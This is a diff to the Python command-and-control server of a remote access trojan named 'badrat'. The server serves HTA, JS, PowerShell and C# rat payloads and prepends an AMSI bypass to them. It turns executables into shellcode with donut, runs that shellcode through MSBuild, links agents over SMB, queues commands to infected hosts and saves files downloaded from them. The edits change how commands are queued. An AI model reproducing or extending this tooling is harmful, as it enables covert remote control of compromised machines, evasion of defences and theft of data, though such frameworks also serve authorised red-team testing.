@@ -55,7 +55,7 @@ supported_types = ["c", "c#", "js", "ps1", "hta"]
 alpha = "abcdefghijklmnopqrstuvwxyz"
 
 # Generate a random path to serve payloads off of
-rand_path = ''.join(random.choice(alpha) for choice in range(10))
+rand_path = ''.join(random.choice(alpha) for choice in range(10)) 
 
 # Only applies to hta and js rats
 prepend_amsi_bypass_to_psh = True
@@ -341,7 +341,7 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
         pretty_print("[*] Sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
         fd = open(os.getcwd() + "/rats/badrat." + types[ratID], 'rb')
         ratcode = fd.read()
-
+        
         if(types[ratID] == "hta" and not no_payload_encryption):
             key = ekript.gen_key()
             js_source = ratcode.split(b"<script>")[1].split(b"</script>")[0]
@@ -365,7 +365,7 @@ def link_smb(ratID, filepath): # returns eval data for rat and registers link di
             smb_link_data = fd.read()
         with open(os.getcwd() + "/resources/run_extra.js", "r") as fd:
             run_extra_data = fd.read()
-
+        
         smb_link_data = smb_link_data.replace("~~FILEPATH~~", filepath.replace("\\", "\\\\"))
         smb_link_data = base64.b64encode(smb_link_data.encode('utf-8')).decode('utf-8')
 
@@ -391,9 +391,9 @@ def unlink_smb(ratID, filepath):
             links[ratID].remove(filepath)
             if(not links[ratID]):
                 links[ratID] = ["None"]
-
+        
         return "ev " + base64.b64encode(smb_unlink_data.encode('utf-8')).decode('utf-8')
-
+    
     else: # PS1 or C#
         return "ul " + filepath
 
@@ -455,7 +455,7 @@ def cs_donut_exec(inp):
         else:
             shellcode = donut.create(file=inp.split(" ")[1])
     return base64.b64encode(shellcode).decode('utf-8') + " " + shellcode_process
-
+    
 
 def donut_exec(inp, ratID):
     if(inp.split(" ")[1].isdigit() or inp.split(" ")[1] == "local"):
@@ -468,7 +468,7 @@ def donut_exec(inp, ratID):
             shellcode = donut.create(file=inp.split(" ")[1], params=" ".join(inp.split(" ")[2:]))
         else:
             shellcode = donut.create(file=inp.split(" ")[1])
-
+        
     return(send_shellcode_msbuild_xml(inp, ratID, shellcode_data=shellcode))
 
 def send_shellcode_msbuild_xml(input_data, ratID, shellcode_data=None):
@@ -633,14 +633,14 @@ def serve_server(port=8080):
         post_json = request.get_json(force=True)
         if(verbose):
             pretty_print("[v] rat sent data: " + str(post_json))
-
+        
         try:
             post_dict = dict(post_json)
             packages = post_dict['p']
         except:
             pretty_print("\n[!] Failed to parse post_dict or pull list of packages out of POST request")
             return(default_page())
-
+            
         return_dict = {"p": []} # We will use this to build the return JSON
         # For loop starts here ... parse each package one at a time
         for package in packages:
@@ -655,7 +655,7 @@ def serve_server(port=8080):
                 if(verbose):
                     pretty_print("\n[!] Failed to grab id, type, username, or hostname param from package " + str(package))
                 continue
-
+    
             # Update checkin time for an agent every checkin
             checkin = datetime.now().strftime("%H:%M:%S")
             rats[ratID] = checkin
@@ -668,32 +668,31 @@ def serve_server(port=8080):
                 upstream[ratID] = "<direct>"
             else:
                 upstream[ratID] = packages[-1]['id'] # the last package is the package on "top of the stack" and so the most upstream rat
-
+    
             # Register new rat checkin
             if(ratID not in commands):
-                commands[ratID] = []
+                commands[ratID] = ""
                 links[ratID] = ["None"]
                 comp.add_tab_item(ratID)
                 pretty_print("[*] (" + datetime.now().strftime("%H:%M:%S, %b %d") + ") New rat checked in: " + colors(ratID))
 
+    
             if("retval" in package.keys()):
+                commands[ratID] = ""
                 pretty_print("[*] Results from rat " + colors(str(package['id'])) + ":\n")
                 pretty_print('\033[1;97m' + base64.b64decode(package['retval']).decode('utf-8') + '\033[0m')
-
+    
             if("dl" in package.keys()):
-                rand = ''.join(random.choice(alpha) for choice in range(10))
+                commands[ratID] = "" # Reset command back to "" (blank) after we finish processing the results
+                rand = ''.join(random.choice(alpha) for choice in range(10)) 
                 with open(Path("downloads/" + ratID + "." + rand).resolve() , "wb") as fd:
                     fd.write(base64.b64decode(package['dl']))
                 pretty_print("\n[*] File download from rat " + colors(ratID) + " saved to " + colors("downloads/" + colors(ratID)) + colors("." + rand))
-
-            if commands[ratID]:
-                for cmnd in commands[ratID]:
-                    return_dict['p'].append({"id": ratID, "cmnd": cmnd})
-                print(return_dict['p'])
-                commands[ratID] = []
-
-
-
+    
+            # Reset the command on deck to blank after sending the command (so we don't get repeated executions of the same command)
+            cmnd = commands[ratID]
+            commands[ratID] = ""
+            return_dict['p'].append({"id": ratID, "cmnd": cmnd})
 
         if(not return_dict['p']): # if no packages in return_dict, return default page
             return(default_page())
@@ -1076,9 +1075,8 @@ if __name__ == "__main__":
                         if(ratID == "all"):
                         # update ALL commands
                             for i in commands.keys():
-                                commands[i].append(inp)
+                                commands[i] = inp
                         else:
-                            commands[ratID].append(inp)
-                            print(commands[ratID])
+                            commands[ratID] = inp
         except KeyboardInterrupt:
             pretty_print("[!] Caught Ctrl+C. Type 'exit' to quit badrat")
